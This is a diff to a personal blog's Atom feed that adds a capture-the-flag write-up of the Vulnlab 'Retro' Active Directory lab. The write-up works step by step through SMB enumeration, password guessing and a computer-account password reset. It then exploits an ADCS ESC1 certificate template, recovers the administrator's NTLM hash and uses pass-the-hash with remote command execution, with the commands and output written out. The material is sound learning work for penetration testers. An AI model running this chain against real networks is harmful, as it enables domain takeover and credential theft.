@@ -1,4 +1,344 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-12-19T16:18:41+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">archive://syl</title><author><name>Dimitar Ganev</name></author><entry><title type="html">Vulnlab - Baby [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby.html" rel="alternate" type="text/html" title="Vulnlab - Baby [Easy]" /><published>2023-12-18T00:00:00+02:00</published><updated>2023-12-18T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby.html">&lt;p&gt;Recently I’ve started to explore more platforms for hacking different type of boxes and I found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xct&lt;/code&gt; has created &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnlab&lt;/code&gt;. From what I’ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the “Baby” lab.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-12-19T21:22:13+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">archive://syl</title><author><name>Dimitar Ganev</name></author><entry><title type="html">Vulnlab - Retro [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro.html" rel="alternate" type="text/html" title="Vulnlab - Retro [Easy]" /><published>2023-12-19T00:00:00+02:00</published><updated>2023-12-19T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro.html">&lt;p&gt;Retro is an easy windows (active directory) machine by Vulnlab.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;I’ve tried to show as many methods as possible to retrieve the same thing, for example retrieving the administrator’s NTLM hash and changing the password for a user with 2 different methods, I hope that you can learn more that way which is the whole point of this write-up!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;p&gt;Started with a simple nmap scan:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN ^Cap.txt -sC -sV 10.10.64.243 -Pn --min-rate 10000
+...
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=12/19%Time=6581A887%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03&quot;);
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next I’ve used enum4linux which showed me the FQDN, Domain and not much else.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ enum4linux 10.10.64.243
+NetBIOS computer name: DC
+NetBIOS domain name: RETRO
+DNS domain: retro.vl
+FQDN: DC.retro.vl
+Derived membership: domain member
+Derived domain: RETRO
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I went on to enumerate the SMB protocol.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u &apos;Guest&apos; -p &apos;&apos; --shares
+SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.10.64.243    445    DC               [+] retro.vl\Guest: 
+SMB         10.10.64.243    445    DC               [*] Enumerated shares
+SMB         10.10.64.243    445    DC               Share           Permissions     Remark
+SMB         10.10.64.243    445    DC               -----           -----------     ------
+SMB         10.10.64.243    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.64.243    445    DC               C$                              Default share
+SMB         10.10.64.243    445    DC               IPC$            READ            Remote IPC
+SMB         10.10.64.243    445    DC               NETLOGON                        Logon server share 
+SMB         10.10.64.243    445    DC               Notes                           
+SMB         10.10.64.243    445    DC               SYSVOL                          Logon server share 
+SMB         10.10.64.243    445    DC               Trainees        READ            
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I went in and checked the readable share “Trainees” and I got the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Important.txt&lt;/code&gt; which contained the following text:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dear Trainees,
+
+I know that some of you seemed to struggle with remembering strong and unique passwords.
+So we decided to bundle every one of you up into one account.
+Stop bothering us. Please. We have other stuff to do than resetting your password every day.
+
+Regards
+
+The Admins
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That is definitely interesting it does hint that there may be weak credentials, so let’s try to enumerate some users. Since that the account “Guest” is working, I used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lookupsid&lt;/code&gt; by the impacket’s scripts.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/tools/impacket/examples$ python3 lookupsid.py Guest@10.10.64.243
+Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra
+
+Password:
+[*] Brute forcing SIDs at 10.10.64.243
+[*] StringBinding ncacn_np:10.10.64.243[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
+498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: RETRO\Administrator (SidTypeUser)
+501: RETRO\Guest (SidTypeUser)
+502: RETRO\krbtgt (SidTypeUser)
+512: RETRO\Domain Admins (SidTypeGroup)
+513: RETRO\Domain Users (SidTypeGroup)
+514: RETRO\Domain Guests (SidTypeGroup)
+515: RETRO\Domain Computers (SidTypeGroup)
+516: RETRO\Domain Controllers (SidTypeGroup)
+517: RETRO\Cert Publishers (SidTypeAlias)
+518: RETRO\Schema Admins (SidTypeGroup)
+519: RETRO\Enterprise Admins (SidTypeGroup)
+520: RETRO\Group Policy Creator Owners (SidTypeGroup)
+521: RETRO\Read-only Domain Controllers (SidTypeGroup)
+522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
+525: RETRO\Protected Users (SidTypeGroup)
+526: RETRO\Key Admins (SidTypeGroup)
+527: RETRO\Enterprise Key Admins (SidTypeGroup)
+553: RETRO\RAS and IAS Servers (SidTypeAlias)
+571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
+572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
+1000: RETRO\DC$ (SidTypeUser)
+1101: RETRO\DnsAdmins (SidTypeAlias)
+1102: RETRO\DnsUpdateProxy (SidTypeGroup)
+1104: RETRO\trainee (SidTypeUser)
+1106: RETRO\BANKING$ (SidTypeUser)
+1107: RETRO\jburley (SidTypeUser)
+1108: RETRO\HelpDesk (SidTypeGroup)
+1109: RETRO\tblack (SidTypeUser)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We got a couple of users:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1000: RETRO\DC$ (SidTypeUser)
+1104: RETRO\trainee (SidTypeUser)
+1106: RETRO\BANKING$ (SidTypeUser)
+1107: RETRO\jburley (SidTypeUser)
+1109: RETRO\tblack (SidTypeUser)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I’ve stripped the users and added them to users.txt with the addition of ‘administrator’. Since I knew that there would be weak credentials, I tried with the following pattern &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user:pass&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u ./users.txt -p ./users.txt 
+SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.10.64.243    445    DC               [+] retro.vl\trainee:trainee
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And I’ve got a hit for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trainee&lt;/code&gt;. Now let’s try to get the SMB shares once again with that user.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u trainee -p trainee --shares
+SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.10.64.243    445    DC               [+] retro.vl\trainee:trainee 
+SMB         10.10.64.243    445    DC               [*] Enumerated shares
+SMB         10.10.64.243    445    DC               Share           Permissions     Remark
+SMB         10.10.64.243    445    DC               -----           -----------     ------
+SMB         10.10.64.243    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.64.243    445    DC               C$                              Default share
+SMB         10.10.64.243    445    DC               IPC$            READ            Remote IPC
+SMB         10.10.64.243    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.64.243    445    DC               Notes           READ            
+SMB         10.10.64.243    445    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.64.243    445    DC               Trainees        READ  
+syl@sylsec:~/vulnlab/Retro$ smbclient //retro.vl/Notes -U &apos;trainee&apos;                                   
+Password for [WORKGROUP\trainee]: trainee
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; ls
+  .                                   D        0  Mon Jul 24 01:03:16 2023
+  ..                                DHS        0  Wed Jul 26 12:54:14 2023
+  ToDo.txt                            A      248  Mon Jul 24 01:05:56 2023
+
+                6261499 blocks of size 4096. 2179053 blocks available
+smb: \&amp;gt; get Todo.txt
+getting file \Todo.txt of size 248 as Todo.txt (1,5 KiloBytes/sec) (average 1,5 KiloBytes/sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I got a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Todo.txt&lt;/code&gt; lets take a look:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Thomas,
+
+after convincing the finance department to get rid of their ancienct banking software
+it is finally time to clean up the mess they made. We should start with the pre created
+computer account. That one is older than me.
+
+Best
+
+James
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This text file hints that there is some ancient banking software and some pre-created computer account, judging by that I can safely assume that they are talking about the account &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BANKING$&lt;/code&gt;, I tried onec again some weak credentials like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$BANKING:banking&lt;/code&gt; and I got this result:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u BANKING$ -p &apos;banking&apos;
+SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.10.64.243    445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The result I got is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT&lt;/code&gt; which means that the password is correct! (REF: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)
+But I cannot use this account until the password is changed, so lets do that. There is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;changepasswd.py&lt;/code&gt; by Impacket (https://github.com/fortra/impacket/blob/master/examples/changepasswd.py) which I can use to change the password via RPC, the thing that I need is another user, which I already have (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trainee&lt;/code&gt;). There are other methods to change the password like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kpasswd&lt;/code&gt; as well.&lt;/p&gt;
+
+&lt;h2 id=&quot;change-the-password-via-rpc-imapckets-changepasswdpy-method-1&quot;&gt;Change the password via RPC (imapcket’s changepasswd.py) Method #1&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(impacket-env) syl@sylsec:~/tools/impacket/examples$ python changepasswd.py retro.vl/&apos;BANKING$&apos;:&apos;banking&apos;@10.10.64.243 -altuser trainee -altpass trainee
+Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra
+
+New password: 
+Retype new password: Summer2018!
+[!] Attempting to *change* the password of retro.vl/BANKING$ as retro.vl/trainee. You may want to use &apos;-reset&apos; to *reset* the password of the target.
+[*] Changing the password of retro.vl\BANKING$
+[*] Connecting to DCE/RPC as retro.vl\trainee
+[*] Password was changed successfully.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;using-kpasswd-method-2&quot;&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kpasswd&lt;/code&gt; Method #2&lt;/h2&gt;
+
+&lt;p&gt;I can go with the LDAP way of chaning the password using the binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kpasswd&lt;/code&gt; and since this is uncommon on Linux you can install it with:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/tools/$ sudo apt install krb5-user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then you have to edit the realms in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/krb5.conf&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;[libdefaults]&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;default_realm&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;RETRO.VL&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;dns_lookup_realm&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;false&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;ticket_lifetime&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;24h&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;renew_lifetime&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7d&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;rdns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;false&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;kdc_timesync&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;ccache_type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;forwardable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;proxiable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
+
+&lt;span class=&quot;nn&quot;&gt;[realms]&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;RETRO.VL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;py&quot;&gt;kdc&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;DC.RETRO.VL&lt;/span&gt;
+                &lt;span class=&quot;py&quot;&gt;admin_server&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;DC.RETRO.VL&lt;/span&gt;
+        &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;[domain_realm]&lt;/span&gt;
+        &lt;span class=&quot;py&quot;&gt;.retro.vl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;RETRO.VL&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then simply invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kpasswd&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ sudo kpasswd BANKING$
+Password for BANKING$@RETRO.VL: 
+Enter new password: 
+Enter it again: 
+Password changed.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now we can use this account later on. Lets enumerate the ADCS (Active Directory Certificate Services). I used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certipy&lt;/code&gt; for that matter.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ certipy find -u trainee -p &apos;trainee&apos; -dc-ip 10.10.113.62 -vulnerable
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for &apos;retro-DC-CA&apos; via CSRA
+[!] Got error while trying to get CA configuration for &apos;retro-DC-CA&apos; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for &apos;retro-DC-CA&apos; via RRP
+[*] Got CA configuration for &apos;retro-DC-CA&apos;
+[*] Saved BloodHound data to &apos;20231219202428_Certipy.zip&apos;. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to &apos;20231219202428_Certipy.txt&apos;
+[*] Saved JSON output to &apos;20231219202428_Certipy.json&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20231219202428_Certipy.txt&lt;/code&gt; we can see a ESC1 vunlerability related to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RetroClients&lt;/code&gt; certificate. More about ESC1: https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/&lt;/p&gt;
+
+&lt;p&gt;Looking at the permissions of the certificate template we notice that it can be used only by:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;RETRO.VL\Domain Admins&lt;/li&gt;
+  &lt;li&gt;RETRO.VL\Enterprise Admins&lt;/li&gt;
+  &lt;li&gt;RETRO.VL\Domain Computers&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I believe that the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BANKING$&lt;/code&gt; is within those groups so lets see:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ bloodhoundpy -dc retro.vl -u trainee -p trainee -d retro.vl
+WARNING: Could not find a global catalog server, assuming the primary DC has this role
+If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: retro.vl
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Found 7 users
+INFO: Connecting to LDAP server: retro.vl
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 53 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: 
+INFO: Querying computer: DC.retro.vl
+INFO: Done in 00M 04S
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I can query the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BANKING$&lt;/code&gt; and I can see its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;First Degree Group Membership&lt;/code&gt; that this user is part of the group &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DOMAIN COMPUTERS&lt;/code&gt;, so we can use that user to exploit the certificate and retrieve the NTLM hash.&lt;/p&gt;
+
+&lt;h1 id=&quot;unpac-the-hash-method-1&quot;&gt;UnPAC the hash Method #1&lt;/h1&gt;
+
+&lt;p&gt;We can use the technique UnPAC the hash to get the NTLM hash using the &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/dirkjanm/PKINITtools&quot;&gt;PKINITtools&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;First we need to retrieve the TGT and the AS-REP encryption key&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro/temp$ gettgtpkinit -cert-pfx ../exfiltrated/administrator.pfx -dc-ip 10.10.113.62 retro.vl/administrator ../exfiltrated/administrator.ccache 
+2023-12-19 20:53:00,328 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2023-12-19 20:53:00,802 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2023-12-19 20:53:00,889 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2023-12-19 20:53:00,889 minikerberos INFO     23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec
+INFO:minikerberos:23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec
+2023-12-19 20:53:00,895 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getnthash.py&lt;/code&gt; to retrieve the NTLM hash.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro/exfiltrated$  getnthash retro.vl/administrator -key 23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec   
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+25....&amp;lt;hash&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;using-certipy-method-2&quot;&gt;Using Certipy Method #2&lt;/h1&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ certipy req -u &apos;BANKING$&apos; -p &apos;Summer2018!&apos; -dc-ip &apos;10.10.64.243&apos; -target &apos;dc.retro.vl&apos; -ca &apos;retro-DC-CA&apos; -template &apos;RetroClients&apos; -upn &apos;administrator&apos; -key-size 4096
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 13
+[*] Got certificate with UPN &apos;administrator&apos;
+[*] Certificate has no object SID
+[*] Saved certificate and private key to &apos;administrator.pfx&apos;
+
+syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip &apos;10.10.64.243&apos; -username &apos;administrator&apos; -domain retro.vl
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@retro.vl
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to &apos;administrator.ccache&apos;
+[*] Trying to retrieve NT hash for &apos;administrator&apos;
+[*] Got hash for &apos;administrator@retro.vl&apos;: aad3b435b51404eeaad3b435b51404ee:25&amp;lt;hash&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we can use that that hash for PTH (Pass the hash) attack.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u administrator -H 252fac7066d93dd009d4fd2cd0368389 -x &quot;cmd /c type C:\Users\Administrator\Desktop\root.txt&quot;
+SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.10.64.243    445    DC               [+] retro.vl\administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)
+SMB         10.10.64.243    445    DC               [+] Executed command via wmiexec
+SMB         10.10.64.243    445    DC               VL{&amp;lt;hash&amp;gt;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Retro is an easy windows (active directory) machine by Vulnlab.</summary></entry><entry><title type="html">Vulnlab - Baby [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby.html" rel="alternate" type="text/html" title="Vulnlab - Baby [Easy]" /><published>2023-12-18T00:00:00+02:00</published><updated>2023-12-18T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby.html">&lt;p&gt;Recently I’ve started to explore more platforms for hacking different type of boxes and I found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xct&lt;/code&gt; has created &lt;code 